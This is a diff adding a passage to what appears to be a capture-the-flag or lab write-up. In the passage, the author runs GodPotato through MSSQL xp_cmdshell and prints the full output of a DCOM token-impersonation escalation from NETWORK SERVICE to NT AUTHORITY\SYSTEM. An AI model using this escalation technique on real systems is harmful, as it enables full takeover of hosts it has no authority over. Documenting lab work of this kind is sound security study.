@@ -948,5 +948,39 @@ evil-winrm-py PS C:\ProgramData>
 Ill then grant all users full control over this file
 
 ```python
-
+SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\GodPotato-NET4.exe -cmd whoami
+output                                                                             
+--------------------------------------------------------------------------------   
+[*] CombaseModule: 0x140728540921856                                               
+[*] DispatchTable: 0x140728543508808                                               
+[*] UseProtseqFunction: 0x140728542801440                                          
+[*] UseProtseqFunctionParamCount: 6                                                
+[*] HookRPC                                                                        
+[*] Start PipeServer                                                               
+[*] CreateNamedPipe \\.\pipe\93a54776-a403-430f-9be4-c841a7dd6d4f\pipe\epmapper    
+[*] Trigger RPCSS                                                                  
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046                            
+[*] DCOM obj IPID: 00004002-0e78-ffff-fe6a-460357866c7c                            
+[*] DCOM obj OXID: 0xbcab7f2389ddf150                                              
+[*] DCOM obj OID: 0xcf701e3b02e5800b                                               
+[*] DCOM obj Flags: 0x281                                                          
+[*] DCOM obj PublicRefs: 0x0                                                       
+[*] Marshal Object bytes len: 100                                                  
+[*] UnMarshal Object                                                               
+[*] Pipe Connected!                                                                
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE                                      
+[*] CurrentsImpersonationLevel: Impersonation                                      
+[*] Start Search System Token                                                      
+[*] PID : 888 Token:0x752  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
+[*] Find System Token : True                                                       
+[*] UnmarshalObject: 0x80070776                                                    
+[*] CurrentUser: NT AUTHORITY\SYSTEM                                               
+[*] process start with pid 3752                                                    
+nt authority\system                                                                
+NULL                                                                               
+SQL (pong\P.Reiner  dbo@master)> 
 ```
+
+Then i can execute commands as SYSTEM
+
+
